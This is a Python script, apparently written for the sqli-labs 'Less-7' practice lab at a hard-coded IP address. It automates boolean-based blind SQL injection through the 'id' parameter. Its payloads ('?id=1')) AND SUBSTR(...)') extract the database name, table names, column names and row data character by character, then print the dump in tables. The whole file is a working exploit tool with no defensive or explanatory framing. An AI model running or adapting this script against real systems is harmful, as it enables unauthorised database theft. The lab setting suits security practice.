import aiohttp
import asyncio
from prettytable import PrettyTable
from colorama import Fore, Style  # 导入 colorama

url = "http://8.137.60.154:8082/Less-7/"
max_length = 25  # 假设字段最大长度为20

# 定义要使用的字符集
charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
           'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
           'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
           '8', '9', '_', '$', '@', '(', ')', '-', '.', '[', ']', '^',
           '{', '}', '~', '!']


async def fetch(session, payload):
    async with session.get(url + payload) as response:
        return await response.text()


async def get_database_name(session):
    db_name = ""
    for length in range(1, 16):
        for char in charset:
            payload = f"?id=1')) AND SUBSTR(database(), {length}, 1)='{char}' --+"
            r = await fetch(session, payload)
            if "You are in.... Use outfile......" in r:
                db_name += char
                print(Fore.GREEN + f"数据库名字符 {length}: {char}" + Style.RESET_ALL)
                break
    return db_name


async def get_table_names(session):
    table_names = []
    table_count = 0
    for count in range(1, 16):
        payload = f"?id=1')) AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={count} --+"
        r = await fetch(session, payload)
        if "You are in.... Use outfile......" in r:
            table_count = count
            break

    print(Fore.YELLOW + f"表的个数: {table_count}" + Style.RESET_ALL)

    for row in range(table_count):
        table_name = ""
        for length in range(1, max_length + 1):
            for char in charset:
                payload = f"?id=1')) AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {row}, 1), {length}, 1)='{char}' --+"
                r = await fetch(session, payload)
                if "You are in.... Use outfile......" in r:
                    table_name += char
                    print(Fore.BLUE + f"表名 {row + 1} 字符 {length}: {char}" + Style.RESET_ALL)
                    break
        table_names.append(table_name.strip())

    print(Fore.CYAN + f"获取的表名: {table_names}" + Style.RESET_ALL)
    return table_names


async def get_fields_and_data(session, table_names):
    all_data = {}
    for table_name in table_names:
        column_names = []
        column_count = 0

        for count in range(1, 16):
            payload = f"?id=1')) AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}')={count} --+"
            r = await fetch(session, payload)
            if "You are in.... Use outfile......" in r:
                column_count = count
                break

        print(Fore.YELLOW + f"表 '{table_name}' 的字段个数: {column_count}" + Style.RESET_ALL)

        for row in range(column_count):
            column_name = ""
            for length in range(1, max_length + 1):
                for char in charset:
                    payload = f"?id=1')) AND SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}' LIMIT {row}, 1), {length}, 1)='{char}' --+"
                    r = await fetch(session, payload)
                    if "You are in.... Use outfile......" in r:
                        column_name += char
                        print(Fore.BLUE + f"字段 '{table_name}' 字符 {length}: {char}" + Style.RESET_ALL)
                        break
            column_names.append(column_name.strip())

        print(Fore.CYAN + f"获取的字段名: {column_names}" + Style.RESET_ALL)

        rows_count = 20
        data = []
        for row in range(rows_count):
            row_data = {}
            for field in column_names:
                field_data = ""
                for length in range(1, max_length + 1):
                    for char in charset:
                        payload = (
                            f"?id=1')) AND SUBSTR((SELECT {field} FROM {table_name} LIMIT {row}, 1), {length}, 1)='{char}' --+"
                        )
                        r = await fetch(session, payload)

                        if "You are in.... Use outfile......" in r:
                            field_data += char
                            print(
                                Fore.GREEN + f"第{row + 1}行, 字段 '{field}', 字符 {length}: {char}" + Style.RESET_ALL)
                            break
                    else:
                        break
                row_data[field] = field_data.strip()

            if row_data and any(row_data.values()):
                data.append(row_data)

        all_data[table_name] = data

    return all_data


async def main():
    async with aiohttp.ClientSession() as session:
        database_name = await get_database_name(session)
        table_names = await get_table_names(session)
        data = await get_fields_and_data(session, table_names)

        print("\n最终获取的信息:")

        db_table = PrettyTable()
        db_table.field_names = ["Database"]
        db_table.add_row([database_name])
        print(db_table)

        for table, rows in data.items():
            print(f"\n表名: {table}")
            table_output = PrettyTable()
            if rows:  # 检查是否有行数据
                table_output.field_names = rows[0].keys()
                for row in rows:
                    table_output.add_row(row.values())
                print(table_output)
            else:
                print(Fore.RED + f"该表没有数据。" + Style.RESET_ALL)


if __name__ == "__main__":
    asyncio.run(main())
